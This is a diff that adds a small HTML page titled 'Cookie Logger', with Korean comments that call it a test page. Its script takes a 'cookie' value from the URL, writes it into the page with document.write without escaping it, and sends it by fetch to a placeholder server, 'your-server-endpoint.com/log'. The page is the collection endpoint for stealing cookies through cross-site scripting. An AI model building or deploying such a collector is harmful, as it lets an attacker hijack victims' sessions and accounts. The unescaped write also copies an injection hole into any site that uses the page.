@@ -1,0 +1,28 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Cookie Logger</title>
+</head>
+<body>
+    <h1>Cookie Logger</h1>
+    <p>쿠키 값이 수집되었습니다.</p>
+    <script>
+        // URL 파라미터에서 쿠키 값을 추출
+        const params = new URLSearchParams(window.location.search);
+        const cookieData = params.get('cookie');
+
+        // 쿠키 값을 화면에 표시 (테스트용)
+        if (cookieData) {
+            document.write("<strong>Collected Cookie:</strong> " + cookieData);
+        }
+
+        // 로그 저장을 위한 요청 (옵션)
+        fetch('https://your-server-endpoint.com/log', {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({cookie: cookieData})
+        });
+    </script>
+</body>
+</html>
